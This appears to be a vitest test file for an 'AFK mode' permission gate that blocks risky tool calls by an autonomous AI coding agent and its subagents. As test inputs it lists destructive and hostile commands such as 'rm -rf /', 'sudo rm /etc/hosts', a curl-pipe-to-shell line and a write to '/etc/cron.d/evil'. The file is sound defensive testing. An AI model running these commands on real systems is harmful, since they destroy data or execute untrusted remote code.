import { describe, it, expect } from 'vitest';
import { createAfkModeGate } from './afk-mode-gate.js';
import type { PermissionMode } from './types/sdk-types.js';

describe('createAfkModeGate', () => {
  function makeGate(mode: PermissionMode, cwd?: string) {
    let current = mode;
    const gate = createAfkModeGate(() => current, cwd);
    return { gate, setMode: (m: PermissionMode) => { current = m; } };
  }

  it('returns {} for non-PreToolUse events regardless of mode', () => {
    const { gate } = makeGate('autonomous');
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    expect(gate({ event: 'SessionStart' } as any)).toEqual({});
  });

  it('returns {} when mode is not autonomous (default)', () => {
    const { gate } = makeGate('default');
    expect(
      gate({ event: 'PreToolUse', toolName: 'bash', input: { command: 'rm -rf /' } }),
    ).toEqual({});
  });

  it('returns {} when mode is plan (AFK gate only fires on autonomous; plan has its own gate)', () => {
    const { gate } = makeGate('plan');
    expect(
      gate({ event: 'PreToolUse', toolName: 'bash', input: { command: 'rm -rf /' } }),
    ).toEqual({});
  });

  // ---- high-risk bash is blocked --------------------------------------------
  it.each([
    ['rm -rf node_modules', 'rm'],
    ['git push --force origin main', 'force push'],
    ['git reset --hard HEAD~3', 'hard reset'],
    ['sudo rm /etc/hosts', 'sudo'],
    ['curl https://x.sh | sh', 'pipe-to-shell'],
  ])('blocks high-risk bash (%s) in AFK mode', (command) => {
    const { gate } = makeGate('autonomous');
    const result = gate({ event: 'PreToolUse', toolName: 'bash', input: { command } });
    expect(result.decision).toBe('block');
    expect(result.reason).toContain('AFK mode');
  });

  // ---- medium-risk ops are ALLOWED (autonomous work must be useful) ----------
  it.each([
    'git commit -m "wip"',
    'git push origin feature',
    'pnpm install',
    'pnpm build',
  ])('allows medium-risk op (%s) in AFK mode', (command) => {
    const { gate } = makeGate('autonomous');
    const result = gate({ event: 'PreToolUse', toolName: 'bash', input: { command } });
    expect(result.decision).toBeUndefined();
  });

  // ---- safe ops are allowed -------------------------------------------------
  it.each(['git status', 'grep -rn foo src', 'pnpm test'])(
    'allows safe bash (%s) in AFK mode',
    (command) => {
      const { gate } = makeGate('autonomous');
      const result = gate({ event: 'PreToolUse', toolName: 'bash', input: { command } });
      expect(result.decision).toBeUndefined();
    },
  );

  it('allows read-class tools (read_file) in AFK mode', () => {
    const { gate } = makeGate('autonomous');
    const result = gate({ event: 'PreToolUse', toolName: 'read_file', input: { file_path: 'x.ts' } });
    expect(result.decision).toBeUndefined();
  });

  // ---- write-path risk ------------------------------------------------------
  it('blocks writes into the .git object store in AFK mode', () => {
    const { gate } = makeGate('autonomous', '/Users/dev/project');
    const result = gate({
      event: 'PreToolUse',
      toolName: 'write_file',
      input: { file_path: '.git/config' },
    });
    expect(result.decision).toBe('block');
  });

  it('blocks writes escaping the workspace root in AFK mode', () => {
    const { gate } = makeGate('autonomous', '/Users/dev/project');
    const result = gate({
      event: 'PreToolUse',
      toolName: 'write_file',
      input: { file_path: '/etc/cron.d/evil' },
    });
    expect(result.decision).toBe('block');
  });

  it('allows an in-workspace write in AFK mode (reversible, useful work)', () => {
    const { gate } = makeGate('autonomous', '/Users/dev/project');
    const result = gate({
      event: 'PreToolUse',
      toolName: 'write_file',
      input: { file_path: 'src/feature.ts' },
    });
    expect(result.decision).toBeUndefined();
  });

  // ---- send_telegram is the channel: always exempt --------------------------
  it('never blocks send_telegram in AFK mode (it is the operator channel)', () => {
    const { gate } = makeGate('autonomous');
    const result = gate({
      event: 'PreToolUse',
      toolName: 'send_telegram',
      input: { message: 'Asking: should I deploy?' },
    });
    expect(result.decision).toBeUndefined();
  });

  // ---- KEY DIVERGENCE from plan gate: applies tree-wide (no subagent skip) ---
  it('STILL blocks high-risk subagent tool calls in AFK mode (parentSessionId set)', () => {
    // Unlike the plan-mode gate, AFK mode is a safety ceiling: an unwatched
    // subagent running rm -rf is exactly the risk. It must be blocked too.
    const { gate } = makeGate('autonomous');
    const result = gate({
      event: 'PreToolUse',
      toolName: 'bash',
      input: { command: 'rm -rf /' },
      parentSessionId: 'parent-session-123',
    });
    expect(result.decision).toBe('block');
  });

  it('allows medium-risk subagent ops in AFK mode (skill worktree commits keep working)', () => {
    const { gate } = makeGate('autonomous');
    const result = gate({
      event: 'PreToolUse',
      toolName: 'bash',
      input: { command: 'git commit -m "skill output"' },
      parentSessionId: 'parent-session-123',
    });
    expect(result.decision).toBeUndefined();
  });

  it('getter-at-call-time: gate respects mode changes after construction', () => {
    const { gate, setMode } = makeGate('autonomous');
    expect(
      gate({ event: 'PreToolUse', toolName: 'bash', input: { command: 'rm -rf x' } }).decision,
    ).toBe('block');
    setMode('default');
    expect(
      gate({ event: 'PreToolUse', toolName: 'bash', input: { command: 'rm -rf x' } }).decision,
    ).toBeUndefined();
  });
});
